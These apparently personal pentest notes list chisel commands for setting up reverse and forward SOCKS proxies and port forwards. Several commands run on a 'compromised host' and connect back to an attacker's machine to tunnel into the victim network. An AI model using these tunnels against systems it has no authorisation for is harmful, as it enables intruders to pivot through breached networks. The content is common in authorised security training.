## Reverse SOCKS Proxy

- Listen on attacking machine
`./chisel server -p LISTEN_PORT --reverse &`
This sets up a listener on your chosen `LISTEN_PORT`.
- On the compromised host, we would use the following command:
`./chisel client ATTACKING_IP:LISTEN_PORT R:127.0.0.1:<port to open for proxy>:socks &`
This command connects back to the waiting listener on our attacking box, completing the proxy

## Forward SOCKS Proxy

- On the compromised host run the following :
`./chisel server -p LISTEN_PORT --socks5` 
- On our own attacking box we would then use:
`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`

## Remote Port Forward

A remote port forward is when we connect back from a compromised target to create the forward.

-  on our attacking machine we use the exact same command as before:
`./chisel server -p LISTEN_PORT --reverse &`

- On the compromised host use the following 
  ` chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`
  
## Local Port Forward
  
- On the compromised target we set up a chisel server:
`./chisel server -p LISTEN_PORT`
- We now connect to this from our attacking machine like so:
` ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT `